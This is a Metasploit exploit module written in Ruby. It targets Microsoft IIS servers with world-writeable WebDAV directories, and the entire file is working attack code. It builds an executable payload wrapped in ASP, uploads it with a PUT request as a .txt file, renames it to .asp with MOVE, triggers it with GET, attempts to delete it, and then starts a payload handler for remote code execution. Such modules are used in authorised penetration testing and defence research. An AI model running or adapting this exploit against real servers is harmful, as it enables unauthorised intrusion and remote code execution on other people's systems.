##
# $Id: iis_webdav_upload_asp.rb 10397 2010-09-20 15:59:46Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize
		super(
			'Name'        => 'Microsoft IIS WebDAV Write Access Code Execution',
			'Description'    => %q{
					This module can be used to execute a payload on IIS servers that
				have world-writeable directories. The payload is uploaded as an ASP
				script using a WebDAV PUT request.
			},
			'Author'      => 'hdm',
			'Version'     => '$Revision: 10397 $',
			'Platform'    => 'win',
			'References'  =>
				[
					['OSVDB', '397'],
					['BID', '12141']
				],
			'Targets'     =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 01 1994'
		)

		register_options(
			[
				OptString.new('PATH', [ true,  "The path to attempt to upload", '/metasploit%RAND%.asp'])
			], self.class)
	end

	def exploit

		# Generate the ASP containing the EXE containing the payload
		exe  = generate_payload_exe
		asp  = Msf::Util::EXE.to_exe_asp(exe)
		path = datastore['PATH'].gsub('%RAND%', rand(0x10000000).to_s)
		path_tmp  = path.gsub(/\....$/, ".txt")

		#
		# UPLOAD
		#
		print_status("Uploading #{asp.length} bytes to #{path_tmp}...")

		res = send_request_cgi({
			'uri'          =>  path_tmp,
			'method'       => 'PUT',
			'ctype'        => 'application/octet-stream',
			'data'         => asp,
		}, 20)

		if (! res)
			print_error("Upload failed on #{path_tmp} [No Response]")
			return
		end

		if (res.code < 200 or res.code >= 300)
			print_error("Upload failed on #{path_tmp} [#{res.code} #{res.message}]")
			case res.code
			when 401
				print_status("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
			end
			return
		end

		#
		# MOVE
		#
		print_status("Moving #{path_tmp} to #{path}...")

		res = send_request_cgi({
			'uri'          =>  path_tmp,
			'method'       => 'MOVE',
			'headers'      => {'Destination' => path}
		}, 20)

		if (! res)
			print_error("Move failed on #{path_tmp} [No Response]")
			return
		end

		if (res.code < 200 or res.code >= 300)
			print_error("Move failed on #{path_tmp} [#{res.code} #{res.message}]")
			case res.code
			when 401
				print_status("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
			when 403
				print_status("Warning: The web site may not allow 'Script Source Access', which is required to upload executable content.")
			end
			return
		end

		#
		# EXECUTE
		#
		print_status("Executing #{path}...")

		res = send_request_cgi({
			'uri'          =>  path,
			'method'       => 'GET'
		}, 20)

		if (! res)
			print_error("Execution failed on #{path} [No Response]")
			return
		end

		if (res.code < 200 or res.code >= 300)
			print_error("Execution failed on #{path} [#{res.code} #{res.message}]")
			return
		end



		#
		# DELETE
		#
		print_status("Deleting #{path}, this doesn't always work...")

		res = send_request_cgi({
			'uri'          =>  path,
			'method'       => 'DELETE'
		}, 20)
		if (! res)
			print_error("Deletion failed on #{path} [No Response]")
			return
		end

		if (res.code < 200 or res.code >= 300)
			print_error("Deletion failed on #{path} [#{res.code} #{res.message}]")
			return
		end

		handler
	end

end
            
